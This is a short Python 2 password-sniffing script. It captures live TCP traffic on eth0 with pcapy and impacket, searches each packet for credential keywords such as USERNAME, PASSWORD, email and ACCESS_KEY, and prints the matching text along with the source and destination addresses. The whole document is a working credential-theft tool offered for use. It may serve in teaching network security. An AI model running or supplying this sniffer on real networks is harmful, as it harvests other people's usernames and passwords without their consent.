#!/usr/bin/python
import sys
import re
import getopt
import pcapy
from impacket.ImpactDecoder import EthDecoder, IPDecoder, TCPDecoder
# Interface to sniff on
dev = "eth0"
# Pcap filter
filter = "tcp"
# Decoder for all layers
eth_dec = EthDecoder()
ip_dec = IPDecoder()
tcp_dec = TCPDecoder()

# This function will be called for every packet, decode it and
# try to find a username or password in it
def handle_packet(hdr, data):
	# Patterns that match usernames and passwords

	pattern = re.compile(r"""(?P<found>(USERNAME|PASS|email|txtusername|txtPassword|username|
		PASSWORD|BENUTZER|PASSWORT|AUTH|ACCESS|ACCESS_?KEY)[=:\s].+)\b""",re.MULTILINE|re.IGNORECASE)
	eth_pkt = eth_dec.decode(data)
	ip_pkt = ip_dec.decode(eth_pkt.get_data_as_string())
	tcp_pkt = tcp_dec.decode(ip_pkt.get_data_as_string())
	payload = ip_pkt.get_data_as_string()
	match = re.search(pattern, payload)

	if match and match.groupdict()['found'] != None:
		if not tcp_pkt.get_SYN() and not tcp_pkt.get_RST() and not tcp_pkt.get_FIN():

			print "%s:%d -> %s:%d" % (ip_pkt.get_ip_src(),tcp_pkt.get_th_sport(),ip_pkt.get_ip_dst(),tcp_pkt.get_th_dport())
			print "\t%s\n" % (match.groupdict()['found'])
	

pcap = pcapy.open_live(dev, 1500, 0, 100)
pcap.setfilter(filter)
print "Sniffing passwords on " + str(dev)
pcap.loop(0, handle_packet)